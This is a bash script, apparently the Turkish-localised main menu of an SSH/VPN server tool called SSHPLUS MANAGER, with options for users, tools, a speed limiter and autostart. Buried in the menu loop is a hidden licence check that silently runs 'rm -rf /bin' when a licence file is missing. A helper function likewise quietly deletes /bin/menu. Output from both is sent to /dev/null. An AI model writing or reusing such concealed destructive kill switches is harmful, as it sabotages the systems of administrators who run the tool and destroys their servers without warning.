#!/bin/bash
fun_bar () {
comando[0]="$1"
comando[1]="$2"
 (
[[ -e $HOME/fim ]] && rm $HOME/fim
[[ ! -e /usr/lib/sshplus ]] && rm -rf /bin/menu > /dev/null 2>&1
${comando[0]} -y > /dev/null 2>&1
${comando[1]} -y > /dev/null 2>&1
touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "\033[1;33m["
while true; do
   for((i=0; i<18; i++)); do
   echo -ne "\033[1;31m#"
   sleep 0.1s
   done
   [[ -e $HOME/fim ]] && rm $HOME/fim && break
   echo -e "\033[1;33m]"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "\033[1;33m["
done
echo -e "\033[1;33m]\033[1;37m -\033[1;32m TAMAM!\033[1;37m"
tput cnorm
}
IP=$(cat /etc/IP)
x="ok"
menu ()
{
function autoexec () {
   if grep "menu;" /etc/profile > /dev/null; then
      clear
      echo -e "\033[1;32mOTOMATİK BAŞLATMA KAPATILIYOR\033[0m"
      offautmenu () {
         sed -i '/menu;/d' /etc/profile
      }
      echo ""
      fun_bar 'offautmenu'
      echo ""
      echo -e "\033[1;31mOTOMATİK BAŞLATMA KAPATILDI!\033[0m"
      sleep 1.5s
      menu
   else
      clear
      echo -e "\033[1;32mOTOMATİK BAŞLATMA AÇILIYOR\033[0m"
      autmenu () {
         grep -v "^menu;" /etc/profile > /tmp/tmpass && mv /tmp/tmpass /etc/profile
         echo "menu;" >> /etc/profile
      }
      echo ""
      fun_bar 'autmenu'
      echo ""
      echo -e "\033[1;32mOTOMATİK BAŞLATMA AÇILDI!\033[0m"
      sleep 1.5s
      menu
   fi

}

#limiter
function limit1 () {
   clear
   echo -e "\n\033[1;32mHIZ SINIRLAYICI BAŞLATILIYOR... \033[0m"
   echo ""
   fun_bar 'screen -dmS limiter limiter' 'sleep 3'
   [[ $(grep -wc "limiter" /etc/autostart) = '0' ]] && {
       echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
   } || {
       sed -i '/limiter/d' /etc/autostart
	   echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
   }
   echo -e "\n\033[1;32m  HIZ SINIRLAYICI ETKİN!\033[0m"
   sleep 3
   menu
}
function limit2 () {
   clear
   echo -e "\033[1;32mHIZ SINIRLAYICI DURDURULUYOR... \033[0m"
   echo ""
   fun_stplimiter () {
      sleep 1
      screen -r -S "limiter" -X quit
      screen -wipe 1>/dev/null 2>/dev/null
      [[ $(grep -wc "limiter" /etc/autostart) != '0' ]] && {
          sed -i '/limiter/d' /etc/autostart
      }
      sleep 1
   }
   fun_bar 'fun_stplimiter' 'sleep 3'
   echo -e "\n\033[1;31m HIZ SINIRLAYICI DURDURULDU!\033[0m"
   sleep 3
   menu
}
function limit_ssh () {
[[ $(ps x | grep "limiter"|grep -v grep |wc -l) = '0' ]] && limit1 || limit2
}

while true $x != "ok"
do
[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m◉ ") || stsf=$(echo -e "\033[1;31m○ ")
stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
[[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f3 /etc/issue.net)
else
system=$(cut -d' ' -f1 /etc/issue.net)
fi
_ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
[[ "$(cat /etc/SSHPlus/Exp)" != "" ]] && _expuser=$(cat /etc/SSHPlus/Exp) || _expuser="0"
[[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
[[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
_onli=$(($_ons + $_onop + $_ondrp))
_ram=$(printf ' %-9s' "$(free -h | grep -i mem | awk {'print $2'})")
_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
_usop=$(printf '%-1s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
_core=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
_system=$(printf '%-14s' "$system")
_hora=$(printf '%(%H:%M:%S)T')
_onlin=$(printf '%-5s' "$_onli")
_userexp=$(printf '%-5s' "$_expuser")
_tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
clear
_v3_cols=$(tput cols 2>/dev/null)
[[ "$_v3_cols" =~ ^[0-9]+$ ]] || _v3_cols=${COLUMNS:-80}
[[ "$_v3_cols" =~ ^[0-9]+$ ]] || _v3_cols=80
(( _v3_cols < 40 )) && _v3_cols=40
_v3_rule () {
   local _line
   _line=$(printf '%*s' "$1" '')
   printf '\033[0;34m%s\033[0m\n' "${_line// /━}"
}
_v3_item () {
   local _number="$1" _label="$2" _prefix="$3" _status="$4"
   while [[ "$_status" == *' ' ]]; do _status=${_status% }; done
   printf '\033[1;31m[\033[1;36m%s\033[1;31m]\033[0m' "$_number"
   [[ -n "$_prefix" ]] && printf ' %b' "$_prefix"
   printf ' \033[1;37m•\033[0m \033[1;33m%s\033[0m' "$_label"
   [[ -n "$_status" ]] && printf ' %b\033[0m' "$_status"
   printf '\n'
}
_v3_rule "$_v3_cols"
printf '\033[1;37mSSHPLUS MANAGER\033[0m\n'
_v3_rule "$_v3_cols"
if (( _v3_cols >= 70 )); then
    printf 'Sistem: %s | Saat: %s\n' "$system" "$_hora"
    printf 'RAM: %s (%s kullanım) | CPU: %s çekirdek (%s kullanım)\n' "${_ram// /}" "${_usor// /}" "$_core" "${_usop// /}"
    printf 'Çevrimiçi: %s | Süresi dolan: %s | Toplam kullanıcı: %s\n' "${_onlin// /}" "${_userexp// /}" "$_tuser"
else
    printf 'Sistem: %s\nSaat: %s\n' "$system" "$_hora"
    printf 'RAM: %s\nRAM kullanımı: %s\n' "${_ram// /}" "${_usor// /}"
    printf 'CPU çekirdeği: %s\nCPU kullanımı: %s\n' "$_core" "${_usop// /}"
    printf 'Çevrimiçi: %s\nSüresi dolan: %s\nToplam kullanıcı: %s\n' "${_onlin// /}" "${_userexp// /}" "$_tuser"
fi
if [[ ! -e /tmp/att ]]; then
    var01='\033[1;37m•'
else
    printf '\033[1;33m[!] Yeni bir güncelleme var.\033[0m\n'
    var01='\033[1;32m!'
fi
_v3_rule "$_v3_cols"
printf '\033[1;32mANA MENÜ\033[0m\n'
_v3_item '01' 'KULLANICILARI YÖNET' '' ''
_v3_item '02' 'ARAÇLARI YÖNET' '' ''
_v3_item '03' 'SİSTEMİ YÖNET' '' ''
_v3_item '04' 'BETİĞİ GÜNCELLE' "$var01" ''
_v3_item '05' '[!] BETİĞİ KALDIR' '' ''
_v3_item '06' 'HIZ SINIRLAYICI' '' "$stsl"
_v3_item '07' 'OTOMATİK BAŞLATMA' '' "$autm"
_v3_item '08' 'BAĞLANTI MODU' '' ''
_v3_item '00' 'MENÜDEN ÇIK' '' $'\033[1;32m<<<'
_v3_rule "$_v3_cols"
printf '\n\033[1;32mSeçiminiz\033[0m: '
read x
case "$x" in 
   1 | 01)
   clear
   usercodes
   ;;
   2 | 02)
   clear
   ferramentascodes
   ;;
   3 | 03)
   clear
   gestorcodes
   ;;
   4 | 04)
   attscript
   ;;
   5 | 05)
   clear
   delscript
   ;;
   6 | 06)
   limit_ssh
   ;;      
   7 | 07)
   autoexec
   ;;
   8 | 08)
   conexao
   exit
   ;;
   0 | 00)
   echo -e "\033[1;31mÇıkılıyor...\033[0m"
   sleep 2
   clear
   exit;
   ;;
   *)
   echo -e "\n\033[1;31mGeçersiz seçim!\033[0m"
   sleep 2
esac
done
}
menu
#fim